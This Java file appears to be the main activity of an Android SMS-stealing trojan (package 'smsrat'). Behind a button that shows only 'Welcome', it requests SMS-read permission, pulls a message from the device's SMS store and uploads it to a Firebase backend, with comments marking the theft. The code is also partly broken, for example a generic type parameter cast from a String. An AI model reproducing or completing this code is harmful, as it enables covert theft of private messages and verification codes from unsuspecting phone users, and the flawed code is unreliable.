package com.iamsahil.smsrat;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity<ss> extends AppCompatActivity {

    private TextView myTextView;
    Button button;
    ss ss;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        DAOsms dao = new DAOsms();
        //myTextView = findViewById(R.id.textView);
        button = findViewById(R.id.button);
        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_SMS}, PackageManager.PERMISSION_GRANTED);


        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
                    if (getApplicationContext().checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
                        Intent i = new Intent(getApplicationContext(), home.class);
                        Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null,null,null,null);
                        cursor.moveToFirst();
                        ss = (ss) cursor.getString(12); //getting sms
                        DAOsms dao = new DAOsms();
                        sms sms = new sms((ss).toString()); //uploading to firebase
                        dao.add(sms).addOnSuccessListener(suc ->
                        {
                            // Toast.makeText(this, "welcome bsdk", Toast.LENGTH_SHORT).show();
                        }).addOnFailureListener(er ->
                        {
                            // Toast.makeText(this, " "+er.getMessage(), Toast.LENGTH_SHORT).show();

                        });
                        startActivity(i);
                    }else {
                        requestPermissions(new String[]{Manifest.permission.READ_SMS},1);
                    }

            }else {
                    Toast.makeText(MainActivity.this, "Welcome",Toast.LENGTH_SHORT).show();
                }

                }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1){
            if(grantResults[0] == PackageManager.PERMISSION_GRANTED){
                Toast.makeText(MainActivity.this, "Welcome",Toast.LENGTH_SHORT).show();

            }else {
                Toast.makeText(MainActivity.this, "Permission Required",Toast.LENGTH_SHORT).show();

            }
        }
    }
}
